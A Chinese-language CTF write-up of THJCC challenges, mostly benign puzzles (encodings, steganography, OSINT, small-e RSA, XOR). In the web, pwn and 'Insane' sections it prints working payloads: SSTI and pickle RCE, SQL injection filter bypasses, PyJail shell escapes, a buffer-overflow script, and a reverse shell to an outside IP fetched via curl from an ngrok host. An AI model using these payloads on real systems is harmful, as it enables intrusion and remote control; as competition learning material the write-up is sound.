---
title: THJCC CTF Writeup
description: THJCC CTF Writeup
pubDate: 05 01 2023
categories:
  - tech
tags:
  - CTF
---

# THJCC-CTF

## Welcome

### Welcome 0x1

```bash!
歡迎來到 THJCC CTF

本次競賽所有Flag格式為 THJCC

記得要詳閱規則 不要作弊!

祝各位榮獲佳績!ヽ(́◕◞౪◟◕‵)ノ

Author : OsGa
```

* 標籤上面有一個 FLAG (1/2)
* 規則的最底下又有一個 (2/2)

> FLAG : THJCC{5cINt_sC4icT_5C1sT}

### Discord 0x1

```bash!
相信你已經加入 Discord 伺服器了!

如果還沒 https://discord.gg/RDhf7rxz4f 趕快加入 領取身份組 !!

我已經把這題的Flag藏在伺服器裡了 快去尋找吧!

備註:題目與ticket無關
```

* 加入 Discord 看到 THJCCBOT 上面有兩段 FLAG (在橫幅跟身分組) (1/3) (3/3)
* (2/3) 在 BOT 的命令 先 ls 再 cat flag.txt 就出來了

> FLAG : THJCC{r3meMB3R!J01Ndi5c0rD_5eRv3r}

## Web

### Empty

```bash!
空空如也的網站....
http://23.146.248.36:10002/

Author: Whale120
```

* base64 解碼 js 裡的東西加上註解的那個神祕路徑裡面的另一段 FLAG :P

> FLAG : THJCC{cookie_&_view_source_!}

### blog

```bash!
http://23.146.248.36:10001/
請幫我找到我blog的密碼,感恩 ><
p.s.我好像很粗心的把密碼留在哪裡qwq
Author: Whale120
```

* 觀察一下，是個 blog 的發表介面，然後每個欄位都有地方可以登入
* 原本在那邊 sqli 但是好久都試不出來 qwq
* 最後回去觀察題目 `p.s.我好像很粗心的把密碼留在哪裡qwq`
* 看到一個疑似 password 的留言 `iloveshark`
* 把他跟 admin 拿去登入就過了 ~~其實這題我卡超久...~~

> FLAG : THJCC{w31c0me_h@cker}

### Simplify

```bash!
http://23.146.248.36:10003/
試著成為admin吧~
可以使用帳號密碼 test:test1234 進行登入

Author: Whale120
```

* 先把 `test:test1234` 拿去登入，然後發現他說我不是 `admin`
* 觀察一下 cookie 把 `test` 改成 `admin`
* 出現其他的東西了! 是個 cat say 然後會根據你 url 後面輸入的東西顯示出來
* 原始碼也有提示 SSTI，去網路找個 payload 送過去就好了

```python!
{{ cycler.__init__.__globals__.os.popen('ls').read() }}
{{ cycler.__init__.__globals__.os.popen('cat f*').read() }}
```

> FLAG : THJCC{w3ak_auth_+_S$TI}

### 🦊🌽

```bash!
你可以變成管理員,看到開心的狐狐嗎?

🌽

*這個Emoji和他的連結跟題目沒有關係(This Emoji and its link are not parts of the lab)

http://23.146.248.36:10010
```

* 這是個會把你的 cookie 拿去 sql 找 row 然後如果你是 admin 就可以回傳 FLAG
* 可以知道我們目標是 sqli 拿到 admin 的權限
* 而主要驗證的地方在這邊

```python!
username, password = base64.b64decode(content.encode()).decode(encoding="utf8").split("@")
        # 去除所有空格
        username = "".join(username.split())
        password = "".join(password.split())

        # 過濾username中所有特殊字符
        mu = re.match(r'.*\W', username)
        if mu is None: 
            # 過濾password中所有英文字母跟等號
            cflag = False
            for w in password: 
                if (w in string.ascii_letters) or (w == "="): cflag = True
            if (cflag): return None
            else:
                conn = sqlite3.connect("user.db")
                rows = conn.execute(f"select * from user where (user='{username}') and (pass='{password}');")

                result = None
                for row in rows: result = tuple(row)
                conn.close()

                if result is None: return None
                else: return str(result[0])
        else: return None
    except: return None 
```

* 可以觀察 rows 有 sqli
* 我們的目標是要 做出像是 `password='' or 1=1;--` 的效果
* `' or 1=1;--` 要 bypass "space" "=" "or"

> "space" 可用 /**/
> "=" 可以用大於小於 2>1
> "or" 可以用 "||"

* 所以全部看起來會像是

```sql!
admin@')/**/||/**/2>1;--

base64 = YWRtaW5AJykvKiovfHwvKiovMj4xOy0t
```

* 拿去 set cookie 就過了 φ(゜▽゜*)♪

![image](https://hackmd.io/_uploads/BJCNGn2bC.png)

> FLAG : THJCC{cUt3_wh1e3_f0x_sh1rakam1_fuBuk1_0x133ee79}

## Misc

### 原神帳號外流

```bash!
http://23.146.248.36:40009/login

小朝是一位來自THJCC這間公司的資安工程師,有一次上班摸魚中無意間開啟了原神並且登入了帳號,然而天真的他居然忘了用vpn就直接登入遊戲,導致公司的藍隊演練工程師攔截封包時,意外獲取了他的帳號,於是身為首席駭客的你並想登入他的原神帳號並且幹走他的遊戲道具。

請在此封包中找到正確的帳號密碼並登入取得flag

Author : dkri3c1
```

* 題目給了一個 pcap 檔，用 wireshark 右鍵 follow TCP Stream 一個一個試密碼就出來了

```bas!
name=Frieren&password=B3stan1me
```

* 試到這個就出來了!

> FLAG : THJCC{W3r3_sHarKKKKKK_MasT3R_C8763}

### 出題者大合照

```bash!
好誒!這是我們在 SITCON 2024 的大合照!

感謝每一位辛苦的出題者 才有這次的比賽!

但是但是 可惡的駭客 潘志豪 把FLAG給藏在這張照片了

你能找到它嗎?

Author : OsGa
```

* 各種技巧試了一下最後用到 steghide 發現有東西
* 試了一下指令

```bash!
steghide extract -sf chal.jpg
```

* passphrase 不用打 直接按 enter
* 就看到有東西寫到 flag.txt

```bash!
soar@universe:/mnt/c/Users/soar/Desktop$ steghide extract -sf chal.jpg
Enter passphrase:
wrote extracted data to "flag.txt".
```

* 打開看就有了

> THJCC{S1TC0N_2o2A_a1l_hAnDs0m3_9uY5}

### PyJail-0 

```bash!
nc 23.146.248.36 40000

Try to escape it!

Author:Naup堇姬
```

* 直接拿你輸入的東西去 eval，沒有擋任何東西

```python!
__import__('os').system('sh')
```

> FLAG : THJCC{Use_M2g1c_f2un3ti0n_in_P9Ja1l!!}

### PyJail-1 

```bash!
nc 23.146.248.36 40001

Try to escape it!I increased security!

Author:Naup堇姬
```

```python!
        print("Try to escape!!This is a jail")
        print("I increased security!!!")
        a=input("> ")
        if len(a)<15:
            eval(a)
        else:
            print("Don't escape!!")
    except:
        print("error")
        exit()
```

* 限制了 15 的長度，否則拿去 eval
* 上網找一下資料，找到 [這個](https://hackmd.io/@sdHUgwi_RuWXfWL7njKG3A/BkGRIJKsi)

```python!
eval(input())
__import__('os').system('sh')
```

* 就可以拿到 shell 了~

> FLAG : THJCC{Inp3t_b9p2sss_lim1t_1n+p3j2i1!}

### Evil Form

```bash!
https://forms.gle/RwfTU2a8LdBZUgxX7

Asia G0dTone在一次地下城冒險中,受到了魔鬥凱薩的攻擊,並且受困於名為表單競技場的技能中,身為首席駭客兼勇者的你請英雄救美吧!

Author : dkri3c1
```

* 這題也不知道是不是預期解 XD
* 我是檢查網頁原始碼然後直接 ctrl + F 找 THJCC

```bash!
"Here is your flag 1/3 : THJCC{",8,null,
```

* 往下找看到奇怪的東西
* 解 unicode + 轉換 HTML equivalent 後看到 

```html!
Y0u Successful Escape The l00p! again<div>BTW I do some encrypt of this message xD<br><div><span>w6C6 :D J@FC 7=28</span> 2/3: <span>w24<<<<E96</span></div></div><div><br></div>
```

* 經過`博元婦產科`那題，我拿去 [cyberchef](https://gchq.github.io/CyberChef/#ieol=CRLF&oeol=CRLF)
* 用 ROT 47

![image](https://hackmd.io/_uploads/SyoyFh2WR.png)

```bash!
Here is your flag 2/3 : Hackkkkthe
```

* 接著往下翻，我找到

```htmlembedded!
"3/3","Y0u must master in hacking google form!!!\nS0 You als0 g00d at Crypto!!!\nSGVyZSBpcyB5b3VyIGZsYWcgMy8zIDogX2dvb2dsZV9mMHJNX01vcmRla2Fpc2VyfQ\u003d\u003d"
```

* 看起來像是 base64
* 解碼後

```bash!
Here is your flag 3/3 : _google_f0rM_Mordekaiser}
```

> FLAG : THJCC{Hackkkkthe_google_f0rM_Mordekaiser}

### Geoguesser???

```bash!
I saw a photo of a cram school on social media that seemed familiar, and I want to know its location.Could you provide the coordinates of the cram school in the photo, rounded to the fourth decimal place? (If you have any question. you can open ticket to tell me)

Flag Format:THJCC{緯度_經度} (ex:THJCC{23.4567_111.2458})

Author:Naup堇姬
```
[題目網址](https://twitter.com/rrharil0302/status/1776462043761238290)

* 目的是找到圖中的補習班-但洩漏了電話!
* 把電話拿去搜尋即可拿到地址

```bash!
68-6 Yamasakichō Shikazawa, Shiso, Hyogo 671-2576日本
```

* 然後去 google map 複製精確經緯度

```bash!
(35.0039558, 134.5426340)
```

> FLAG : THJCC{35.0039_134.5426}

### I want to go to Japan

```bash!
I want to go JAPAN!!!This shrine is so cute!Tell me where it is. 

Flag Format:THJCC{緯度_經度} (Taken from the third decimal place, the answer is mainly from wiki) ex:THJCC{20.478_154.789}

Author:Naup堇姬
```

[題目位置](https://twitter.com/rrharil0302/status/1782034885626188150)

* 這題前面我一直在耍笨，一直以為是飯店就一直填飯店的位置，回去看題目才發現是神社......
* 先去找圖片上女孩的名字，可以發現是在北海道函館那邊

[後來找到這個然後去搜尋了附近的神社](https://lawrencium-onmusu.blog.jp/archives/21878126.html)

[找到這個神社](https://ja.wikipedia.org/wiki/%E6%B9%AF%E5%80%89%E7%A5%9E%E7%A4%BE)

* 把經緯度填上去就中了

```bash!
(41.782_140.791)
```

> FLAG : THJCC{41.782_140.791}

## Crypto

### 博元婦產科

```bash!
你好,我是博元妇产科蔡医师,近期我们正计画打造一批超强资安人才菁英,结果发生意外,这群小鬼居然绑架我,还差5000元就能逃离出他们魔掌 ,但我的银行号码被他们给加密了,这是加密后的银行号码TUFDVlZ7cFBwLnU0VXJmVGQzay52MEYubVB9Cg== ,你现在帮过我,我承诺送你蔡医师水洗T还有蔡医梳,并帮你培养一个 试管婴儿。

Author:OsGa
```

* 先 base64 解碼

```bash!
MACVV{pPp.u4UrfTd3k.v0F.mP}
```

* 看起來有點像 FLAG
* 但很明顯有偏差，但 {} 沒有被替換掉，可以想到 ROT
* 試試看 [cyberchef 的 ROT13 Brute Force](https:// "title")

```bash!
Amount =  4: QEGZZ{tTt.y4YvjXh3o.z0J.qT}
Amount =  5: RFHAA{uUu.z4ZwkYi3p.a0K.rU}
Amount =  6: SGIBB{vVv.a4AxlZj3q.b0L.sV}
Amount =  7: THJCC{wWw.b4BymAk3r.c0M.tW}
Amount =  8: UIKDD{xXx.c4CznBl3s.d0N.uX}
Amount =  9: VJLEE{yYy.d4DaoCm3t.e0O.vY}
Amount = 10: WKMFF{zZz.e4EbpDn3u.f0P.wZ}
Amount = 11: XLNGG{aAa.f4FcqEo3v.g0Q.xA}
```

* 在 7 的地方看到 FLAG 了!

> FLAG : THJCC{wWw.b4BymAk3r.c0M.tW}

### Baby RSA

```bash!
我第一次寫RSA加密系統,它應該非常安全吧?
Author: Whale120


----------out.txt--------------

n=82905415164584389498448026225415348174116889583631879848801181149026319038674433017502044002549515598507479948874775953835212967198538225241428587373756775740055748735130854340971352961320030869329470225485298576771293717521094156379711969189220894688314434350844834550493516522022887482934023393062055248939
e=3
c=1235510871330310226418475368687292699345971692547143305272739246584681306551612197261843363110934247264155805712224284359950318209523214607727920666576650829438419066769737275066742744939310467207427865797663652787759689887376716363284875754160160311515163574335764507693157
```

* 其實我不太會 crypto 但這題解的人數太多我就是著解解看
* 最後在網路找到 [maple's blog](https://blog.maple3142.net/2021/03/30/picoctf-2021-writeups/#mini-rsa)
* 改一下數字再跑就可以了

```python!
import gmpy2

n = 82905415164584389498448026225415348174116889583631879848801181149026319038674433017502044002549515598507479948874775953835212967198538225241428587373756775740055748735130854340971352961320030869329470225485298576771293717521094156379711969189220894688314434350844834550493516522022887482934023393062055248939
c=1235510871330310226418475368687292699345971692547143305272739246584681306551612197261843363110934247264155805712224284359950318209523214607727920666576650829438419066769737275066742744939310467207427865797663652787759689887376716363284875754160160311515163574335764507693157

for k in range(10000000000):
    [r, exact] = gmpy2.iroot(c + n * k, 3)
    if exact:
        print(k)
        print(r)
        print(bytes.fromhex(hex(r)[2:]))
        print(r ** 3 - n)
        break

        
PS C:\Users\soar\Desktop\THJCC> python .\ano.py
0
10730390416708815983109252601170483548761139798721771578612051039742995577854304300261210493
b'THJCC{small_eeeee_can_be_pwned_easily}'
-82905415164584389498448026225415346938606018253321653430325812461733619692702740470358738729810269013826173397262578691991849856264290961085622875149472415789737539211916246613050686384669201430910403455748023510028548778210626948951846171525568106928624546974128471265617762361862575967770449057297547555782
```

> FLAG : THJCC{small_eeeee_can_be_pwned_easily}

### 《SSS.GRIDMAN》

```bash!
nc 23.146.248.36 20000

I find this computer.It may have secret about GRIDMAN

Author:Naup堇姬
```

~~丟程式碼給 GPT 生出解密腳本~~

```python!
import numpy as np

shares = [(274, 3183503957), (900, 3802401987), (180, 3147556947)] # 手動替換
x_values = [x for x, _ in shares]
y_values = [y for _, y in shares]

degree = len(shares) - 1
recovered_poly = np.polyfit(x_values, y_values, degree)

secret = int(recovered_poly[-1])

print("Recovered Secret:", secret)
```

* 再把 secret 輸入回去就有 FLAG 了

> FLAG : THJCC{SSS_1s_a_c001_w2y_t0_pr0t3c7_s3c23t}

### JPG^PNG=?

```bash!
I use JPG ang PNG to xor.Can you try to decrypt the image?

Author:Naup堇姬
```

* 題目給了 enc.txt 跟 server.py
* 先觀察一下 server.py 怎麼實作的

```python!
from itertools import cycle

def xor(a, b):
    return [i^j for i, j in zip(a, cycle(b))]

KEY= open("key.png", "rb").read()
FLAG = open("flag.jpg", "rb").read()

key=[KEY[0], KEY[1], KEY[2], KEY[3], KEY[4], KEY[5], KEY[6], KEY[7]]

enc = bytearray(xor(FLAG,key))

open('enc.txt', 'wb').write(enc)
```

* 可以看到他拿了 key.png 的前 8 位來做 xor
* 而 xor 可倒推 所以我們只要知道 key 就可以解回去了
* 而每個檔案都有自己的 magic header 根據 [這個](https://en.wikipedia.org/wiki/List_of_file_signatures) 查表

```bash!
89 50 4E 47 0D 0A 1A 0A
```

* 以上就是 png 一開始的東西 剛好是 key 的長度
* 就可以寫個 python 解回去了

```python!
from itertools import cycle

def xor(a, b):
    return [i^j for i, j in zip(a, cycle(b))]

key = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]
enc = open("enc.txt", "rb").read()

flag = bytearray(xor(enc, key))
open('flag.jpg', 'wb').write(flag)
```

![image](https://hackmd.io/_uploads/HkEAu6nW0.png)

## Pwn

### NC

```bash!
nc 172.104.114.9 30000
```

* nc 上去 然後他要叫你回答 [這個](https://youtu.be/dQw4w9WgXcQ) 是誰上傳的

```bash!
Rick Astley
```

* 丟上去就有FLAG了

> FLAG : THJCC{N3veR_g0nn4_l37_You_dOwn!!!}

### Ret2func

```bash!
Someone told me that gets is dangerous but WHY??

nc 172.104.114.9 30004
Author: Aukro
```

```c!
void win() {
    system("sh");
}


int main() {
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    
    puts("Do you want to be a VIP of Country Wahahabihal");
    printf("You would need %lld dollars if you want\n",main);
    char choice [5];
    char username[32];
    scanf("%5s", choice);
	getchar();
    if(choice[0] == 'y'){
        gets(username);
        puts("Congratulation, you're now the 1st VIP of Country Wahahabihal");
    }
    else {
        exit(0);
    }
    return 0;

}
```

* 有個 win function 直接讓你跳
* 還使用 gets 做 input 所以可以 BOF
* 所以去把 win 的位址找出來再蓋位置就好

> 我原本是蓋 0x28 個 A 但一直失敗卡了超久，最後暴力試到 segmentation fault 才蓋成功。

```python!
from pwn import *
import time

context.log_level = 'debug'
r = remote('23.146.248.36', 30004)

r.sendlineafter('you want', 'y')
time.sleep(1)
addr = 0x40121e

r.sendline(b'A'*56 + p64(addr))
r.interactive()
```

## Reverse

### Baby C

```bash!
保證簡單,輸入密碼就好 :D
所以說我現在在聽什麼呢?
Author: Whale120
```

* 寫個腳本把 password 解回來就好

```python!
a = [44, 48, 50, 59, 59, 3, 16, 12, 12, 8, 11, 66, 87, 87, 15, 15, 15, 86, 1, 23, 13, 12, 13, 26, 29, 86, 27, 23, 21, 87, 15, 25, 12, 27, 16, 71, 14, 69, 75, 32, 59, 46, 53, 75, 63, 75, 8, 22, 11, 5]
tar = 120
result = ""

for i in a:
    result += chr(i ^ tar)

print(result)
```

> FLAG : THJCC{https://www.youtube.com/watch?v=3XCVM3G3pns}

### PYC REVERSE

```bash!
Strange file?Do you know what is .pyc

Author:Naup堇姬

------------msg.txt---------------
10730390416708814647386325276467849806006354580175878786363505755256613965929606057246313695
```

* 要先把 .pyc 反編譯回去，我用 [pycdc](https://github.com/zrax/pycdc)

```python!
soar@universe:/mnt/c/Users/soar/Downloads$ pycdc main.pyc
# Source Generated with Decompyle++
# File: main.pyc (Python 3.10)

from FLAG import FLAG
from Crypto.Util.number import bytes_to_long

def xor1(flag):
    return flag ^ 124789


def xor2(flag):
    return flag ^ 487531


def xor3(flag):
    return flag ^ 784523


def xor4(flag):
    return flag ^ 642871


def xor5(flag):
    return flag ^ 474745

flag = bytes_to_long(FLAG)
count = 0
count += 1
if count == 1:
    flag = xor1(flag)
    count += 2
    if count == 3:
        flag = xor2(flag)
        count += 1
    if count == 4:
        flag = xor3(flag)
        count -= 2
    else:
        flag = xor2(flag)
        count += 1
else:
    flag = xor3(flag)
    count += 5
if count == 2:
    flag = xor4(flag)
elif count == 6:
    flag = xor5(flag)
print(flag)
```

* 寫個腳本解回去就好了

```python!
from Crypto.Util.number import long_to_bytes

enc_flag = 10730390416708814647386325276467849806006354580175878786363505755256613965929606057246313695

def xor1(flag):
    return flag ^ 124789

def xor2(flag):
    return flag ^ 487531

def xor3(flag):
    return flag ^ 784523

def xor4(flag):
    return flag ^ 642871

def xor5(flag):
    return flag ^ 474745

aaa = xor1(xor2(xor3(xor4(enc_flag))))

print(long_to_bytes(aaa))
```

> FLAG : THJCC{pyc_rev3r3e_C3n_u32_on1i5e_t0Ol}

### ⚾

```bash!
Are you a good Pitcher?
Author: FlyDragon
```

* 玩了一下，不管怎麼樣都會 homerun
![image](https://hackmd.io/_uploads/rJ05aR2-C.png)
* 往 miss 追一下，看到 會呼叫 flag
* 那我們就直接把程式 patch 成呼叫 miss 就好了
* 這裡我用 IDA 的 patch 直接 call
* 我是直接 patch 上面的那個函式 XD

![image](https://hackmd.io/_uploads/ryBIARnZR.png)

* 然後存回去執行
* 選完就直接跑出 flag 了

```bash!
soar@universe:/mnt/c/Users/soar/Desktop/THJCC/rev$ ./game
===== Welcome to the baseball game! =====
Your opponent is Ohtani Shohei !
1
========== Baseball Court ==========

                 B▭
                 /  \
                /    \
               /      \
              /   P    \
             ▬        ▬
               ╲  ▬  ╱

========== Baseball Court ==========

Please choose the pitch you want to throw
(1) Fastball
(2) Curveball
(3) Slider
(4) Changeup
4
███╗   ███╗██╗███████╗███████╗
████╗ ████║██║██╔════╝██╔════╝
██╔████╔██║██║███████╗███████╗
██║╚██╔╝██║██║╚════██║╚════██║
██║ ╚═╝ ██║██║███████║███████║
╚═╝     ╚═╝╚═╝╚══════╝╚══════╝
Missed!! So u win :>
THJCC{u_8e@t_m3...}�
```

> FLAG : THJCC{u_8e@t_m3...}

## Insane

### 🥒

```bash!
某個人花費新台幣十萬元重金打造了個人檔案自製系統

讓所有人(包括他自己)可以在這個平台上展現(看似)完美的自我

但是製作網站的工程師不滿他的態度,製作網站時順手埋了漏洞

你可以找到漏洞,取得藏在服務器內的flag嗎?

http://23.146.248.36:10008

Author: pour33142GX
```


* 可以讓你上傳檔案，看起來就很不安全，看看他是怎麼實作的

```python!
def profile():
    if request.method == "GET": 
        u, d = parse("example/adminExample.pickle")
        return render_template("admin.html", user = u, des = d, fileHeader = "ExampleProfile")
    elif request.method == "POST":
        if 'file' in request.files:
            file = request.files['file']
            if file.filename == '': return "FAIL"
            else: 
                filename = f"uploads/{random.randint(1000000000, 9999999999)}.pickle"
                file.save(filename)
                with open(filename, "rb") as f: item = pickle.load(f)
                return render_template("admin.html", user = item.user, des = item.description, fileHeader = "Your Profile")
```

* 可以看到他拿了你傳的檔案直接做了 pickle.load 直接想到了反序列化，還沒擋任何東西，寫個 python 傳上去就可以 RCE 了

#### exploit

* Hint 有說 reverse shell 彈不回來可以用 curl 但我過了 10 分鐘他還是卡在那邊 XD，所以我自己寫個 sh 讓他下載執行讓他彈回來 :D

##### Server

```python!
from flask import Flask, send_file

app = Flask(__name__)

@app.route('/download')
def download_shell():
    filename = 'shell.sh'
    return send_file('./' + filename, as_attachment=True)

if __name__ == '__main__':
    app.run(debug=True)
```

```python!
/bin/sh -i >& /dev/tcp/148.100.77.86/8888 0>&1
```

##### Exp

```python!
import pickle
import base64
import os

command = 'curl https://b33a-123-193-178-235.ngrok-free.app/download -o /tmp/shell.sh && chmod +x /tmp/shell.sh'

#command = 'bash /tmp/shell.sh'

class Exp:
    def __reduce__(self):
        return (__import__('subprocess').getoutput, (command,))


with open('payload.pickle', 'wb') as f:
    pickle.dump(Exp(), f)
```

![image](https://hackmd.io/_uploads/B1WaU8CW0.png)

> FLAG : THJCC{yumwy_RCe_qr0f!13_p1ckl3_Ou0b}

### FFAM(Find Flag Automaticaliiy Machine)

```bash!
http://23.146.248.36:10000/

This is a machine developed by Naup. Compared with FFAM, it can automatically dig out flags. But he doesn't have enough RAM... . You can try to buy some RAM!!

Warning:Please do not maliciously damage the chall.If you think your idea is correct but you can't succeed, please open a ticket and I will check the status of the chall.

Author:Naup堇姬
```

~~這題感覺是叫我們挖礦~~
* 簡單來講有 RAM 就可以做更多事，所以我們要想辦法買RAM

來看看他怎麼買 RAM

```python!
if YourToKeNinShop!=JWTMODE.JWT_Naup() and (RAM>0 or RAM<0):
        
    flash("You are not my MASTER!Bad hacker!")
```

* 這邊是用 jwt 驗證身分的，原本用 [jwt-cracker](https://github.com/lmammino/jwt-cracker) 去爆但內存都不夠了還沒跑出來 (￣ ‘i ￣;)

網站一開始給了個 webshell 但長度只能小於五，還有一堆字都不能用，後來踹到 * 可以選到 `ASECRETKEY.txt` 的檔名，而執行他可以 leak 出 key，我們就可以任意簽 [jwt](https://jwt.io/) 了

![image](https://hackmd.io/_uploads/BJU0K8CbC.png)

設完後不要重新整理，會被洗掉...被搞了五次才回去看了程式

* 至於搞錢了話，把另外兩個設負的先買，就有用不完的錢了!

* 買完後就可以去 /shell 用比較沒限制的 shell 了!

```python!
@app.route("/exe", methods=["GET", "POST"])
def exe():
    if session["RAM"] <3:
        return redirect("/FFAM")
    data = request.json
    user_input = data.get('userInput')
   
    BLACKLIST=[ ';', '>','|', '&', '<', '\n','`', '*', '?','{' , '}', '[', ']','%']
    for i in BLACKLIST:
        if i in user_input:
            return "You are not my MASTER.You don't use this character."
        
    cmd="cat %s.txt"% (user_input)
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        output = str(result.stdout)
        
        return output
    else:
        output = "Command failed with error code:"+str(result.returncode)
        return output
```

* 禁掉了一些危險東西，但還有 $() 能用
* 所以像上題一樣我傳 sh 過去 開 reverseshell 就好了!
* 喔對 這邊要分開給，因為有擋 `&`

```bash!
$(curl https://35c9-123-193-178-235.ngrok-free.app/download -o /tmp/shell.sh)
$(chmod +x /tmp/shell.sh)
$(bash /tmp/shell.sh)
```

![image](https://hackmd.io/_uploads/SygvTUCZA.png)

> FLAG : THJCC{F1nd_F1ag_2ut0m2t1c_mach1n3!!!}